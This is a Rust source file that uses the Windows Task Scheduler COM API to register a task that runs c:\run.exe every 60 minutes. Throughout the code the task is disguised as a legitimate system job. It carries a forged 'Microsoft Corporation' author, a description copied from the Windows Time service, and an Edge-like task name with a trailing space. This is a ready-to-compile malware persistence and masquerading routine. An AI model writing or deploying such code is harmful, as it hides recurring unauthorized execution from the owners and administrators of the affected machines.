use std::ptr::null_mut;
use std::iter::once;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use chrono::prelude::Utc;
use winapi::Interface;
use winapi::Class;
use winapi::{
    ctypes::c_void,
    shared::{
        wtypesbase::CLSCTX_INPROC_SERVER,
        rpcdce::{
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE
        },
    },
    um::{
        oaidl::VARIANT,
        objbase::COINIT_APARTMENTTHREADED,
        combaseapi::{
            CoInitializeEx,
            CoInitializeSecurity,
            CoCreateInstance
        },
        taskschd::{
            TASK_ACTION_EXEC,
            TASK_TRIGGER_TIME,
            TASK_CREATE_OR_UPDATE, 
            TASK_LOGON_INTERACTIVE_TOKEN,
            TaskScheduler,
            ITaskFolder, 
            ITaskService, 
            IRepetitionPattern,
            IExecAction,
            IRegisteredTask,
            IAction,
            IActionCollection,
            ITaskDefinition,
            ITriggerCollection,
            ITrigger,
            IRegistrationInfo
        }
    },
};


fn to_win_str(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(once(0)).collect()
}

fn tasks(temppath: &str ,interval: &str){
    //win 定时计划任务 
    //https://docs.microsoft.com/zh-cn/windows/win32/taskschd/time-trigger-example--c---
    let dt = Utc::now(); 
    let variant:VARIANT = unsafe { std::mem::zeroed() };

    unsafe{
        CoInitializeEx(
            null_mut(),
            COINIT_APARTMENTTHREADED);
        CoInitializeSecurity(
            null_mut(),
            -1,
            null_mut(),
            null_mut(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            null_mut(),
            0,
            null_mut());
        let mut task_service: *mut ITaskService = null_mut();
        CoCreateInstance(
            Box::into_raw(Box::new(TaskScheduler::uuidof())),
            null_mut(),
            CLSCTX_INPROC_SERVER,
            Box::into_raw(Box::new(ITaskService::uuidof())),
            &mut task_service as *mut *mut ITaskService as *mut *mut c_void);
        let p_service = &mut *task_service;
        p_service.Connect(variant, variant, variant, variant);
        let mut rootfolder: *mut  ITaskFolder = null_mut();
        p_service.GetFolder(
            to_win_str("\\").as_mut_ptr(),  //设置任务空间
            &mut rootfolder as *mut *mut ITaskFolder); 
        let mut task: *mut ITaskDefinition = null_mut();
        p_service.NewTask(0, &mut task as *mut *mut ITaskDefinition);
        let p_task = &mut *task;

        let mut registrationinfo: *mut IRegistrationInfo = null_mut();
        p_task.get_RegistrationInfo(&mut registrationinfo as *mut *mut IRegistrationInfo);
        let p_registration_info = &mut *registrationinfo;
        p_registration_info.put_Author(
            to_win_str("Microsoft Corporation").as_mut_ptr());
        p_registration_info.put_Description(
            to_win_str("维护在网络上的所有客户端和服务器的时间和日期同步。如果此服务被停止，时间和日期的同步将不可用。如果此服务被禁用，任何明确依赖它的服务都将不能启动。").as_mut_ptr());   

        let mut triggercollection: *mut ITriggerCollection = null_mut();
        p_task.get_Triggers(&mut triggercollection as *mut *mut ITriggerCollection);
        let p_trigger_collection = &mut *triggercollection;
        let mut trigger: *mut ITrigger = null_mut();
        p_trigger_collection.Create(TASK_TRIGGER_TIME, &mut trigger as *mut *mut ITrigger);
        let p_trigger = &mut *trigger;
        let now = dt.format("%Y-%m-%dT%H:%M:%S").to_string();
        p_trigger.put_StartBoundary(to_win_str(&now).as_mut_ptr()); //设置当前时间为开始时间
        let mut repetitionpattern: *mut IRepetitionPattern = null_mut();
        p_trigger.get_Repetition(&mut repetitionpattern as *mut *mut IRepetitionPattern);
        let p_repetition_pattern = &mut *repetitionpattern;
        p_repetition_pattern.put_Interval(
            to_win_str(interval).as_mut_ptr());  //"PT60M" 设置每60分钟启动一次
        let mut actioncollection: *mut IActionCollection = null_mut();
        p_task.get_Actions(&mut actioncollection as *mut *mut IActionCollection);
        let p_action_collection = &mut *actioncollection;
        let mut action: *mut IAction = null_mut();
        p_action_collection.Create(TASK_ACTION_EXEC, &mut action as *mut *mut IAction);
        let p_action = &mut *action;
        let mut execaction: *mut IExecAction = null_mut();
        p_action.QueryInterface(
            Box::into_raw(Box::new(IExecAction::uuidof())), 
            &mut execaction as *mut *mut IExecAction as *mut *mut c_void);
        let p_exec_action = &mut *execaction;
        p_exec_action.put_Path(to_win_str(temppath).as_mut_ptr());  //设置动作路径
        let registeredtask: *mut IRegisteredTask = null_mut();
        let p_root_folder = &mut *rootfolder;
        p_root_folder.RegisterTaskDefinition(
            to_win_str("MicrosoftEdgeWindowTimeTriggerUpdate ").as_mut_ptr(),  //设置任务名称
            p_task,
            TASK_CREATE_OR_UPDATE as i32, 
            variant, 
            variant, 
            TASK_LOGON_INTERACTIVE_TOKEN,
            variant,
            registeredtask as *mut *mut IRegisteredTask);
    }
}

fn main(){
    tasks("c:\\run.exe","PT60M");
}